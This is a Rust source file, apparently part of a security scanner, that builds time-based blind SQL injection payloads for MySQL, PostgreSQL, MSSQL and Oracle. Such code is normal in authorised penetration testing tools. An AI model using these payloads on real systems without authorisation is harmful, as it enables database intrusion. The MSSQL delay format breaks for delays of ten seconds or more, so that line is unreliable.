#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct TimePayload {
    pub payload: String,
    pub sleep_secs: f64,
    pub dbms: Option<String>,
}

impl TimePayload {
    #[must_use]
    pub fn new(payload: impl Into<String>, sleep_secs: f64, dbms: Option<String>) -> Self {
        Self {
            payload: payload.into(),
            sleep_secs,
            dbms,
        }
    }
}

#[must_use]
pub fn time_payload_for(dbms: Option<&str>, secs: f64) -> TimePayload {
    let s = secs as u64;
    let payload = match dbms {
        Some("mysql") => format!("' AND SLEEP({s}) -- -"),
        Some("postgres") => format!("'; SELECT pg_sleep({s}) --"),
        Some("mssql") => format!("'; WAITFOR DELAY '00:00:0{s}' --"),
        Some("oracle") => format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{s}) --"),
        _ => format!("' AND SLEEP({s}) -- -"),
    };
    TimePayload::new(payload, secs, dbms.map(str::to_owned))
}
